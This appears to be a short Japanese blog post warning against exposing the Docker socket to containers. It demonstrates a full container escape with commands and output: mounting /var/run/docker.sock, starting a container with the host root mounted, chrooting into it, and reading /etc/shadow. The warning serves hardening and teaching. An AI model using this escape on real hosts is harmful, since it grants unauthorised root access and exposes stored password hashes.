
# /var/run/docker.sockを公開してはいけない
/var/run/docker.sockはdockerdと通信するためのunixソケットである。コンテナからホストOSの/var/run/docker.sockに書き込み権限があるとホストOSのrootに権限昇格が可能になる。

/var/run/docker.sockをマウントしてコンテナを起動する。
```
$docker container run --rm -v /var/run/docker.sock:/var/run/docker.sock -it alpine:latest /bin/sh
```
コンテナにdockerをインストールする。
```
/ # apk update && apk add docker
fetch http://dl-cdn.alpinelinux.org/alpine/v3.12/main/x86_64/APKINDEX.tar.gz
fetch http://dl-cdn.alpinelinux.org/alpine/v3.12/community/x86_64/APKINDEX.tar.gz
v3.12.0-216-gaf4199bc57 [http://dl-cdn.alpinelinux.org/alpine/v3.12/main]
v3.12.0-213-gfedcac4c0f [http://dl-cdn.alpinelinux.org/alpine/v3.12/community]
OK: 12749 distinct packages available
(1/12) Installing ca-certificates (20191127-r4)
(2/12) Installing libseccomp (2.4.3-r0)
(3/12) Installing runc (1.0.0_rc10-r1)
(4/12) Installing containerd (1.3.4-r1)
(5/12) Installing libmnl (1.0.4-r0)
(6/12) Installing libnftnl-libs (1.1.6-r0)
(7/12) Installing iptables (1.8.4-r1)
(8/12) Installing tini-static (0.19.0-r0)
(9/12) Installing device-mapper-libs (2.02.186-r1)
(10/12) Installing docker-engine (19.03.12-r0)
(11/12) Installing docker-cli (19.03.12-r0)
(12/12) Installing docker (19.03.12-r0)
Executing docker-19.03.12-r0.pre-install
Executing busybox-1.31.1-r16.trigger
Executing ca-certificates-20191127-r4.trigger
OK: 307 MiB in 26 packages
```

コンテナ上で`docker container ls`してみると自分自身がコンテナであることがわかる。
```
/ # docker container ls
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
50bf098512e5        alpine:latest       "/bin/sh"           5 minutes ago       Up 5 minutes                            lucid_williamson
/ # cat /etc/hostname
50bf098512e5
/ # 

```

新たにコンテナを起動して、`chroot`する。
```
/ # docker container run --rm -v /:/host -it alpine /bin/sh
/ # chroot /host
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@2367afbcff80:/# docker container ls
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
2367afbcff80        alpine              "/bin/sh"           53 seconds ago      Up 51 seconds                           dazzling_feynman
50bf098512e5        alpine:latest       "/bin/sh"           11 minutes ago      Up 11 minutes                           lucid_williamson
root@2367afbcff80:/# cat /etc/hostname
＜ホストOSのホスト名が返る＞
root@2367afbcff80:/# cat /etc/shadow
```

これでホストOS側のroot権限で/ディレクトリをマウントできている状態になるため、`/etc/shadow`ファイルなども閲覧可能になる。